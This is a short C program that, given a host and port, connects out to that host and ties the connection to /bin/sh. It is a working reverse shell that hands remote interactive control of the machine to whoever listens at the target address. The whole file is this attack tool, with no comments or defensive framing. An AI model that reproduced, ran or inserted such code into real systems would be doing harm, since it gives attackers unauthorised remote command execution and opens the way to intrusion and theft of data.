#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{
    int port, sockt;
    struct sockaddr_in revsockaddr;

    if (argc != 3)
    {
        fprintf(stderr, "usage: %s HOST PORT\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    port = atoi(argv[2]);

    sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(argv[1]);

    connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char *const sh_argv[] = {"sh", NULL};
    execve("/bin/sh", sh_argv, NULL);

    return 0;
}
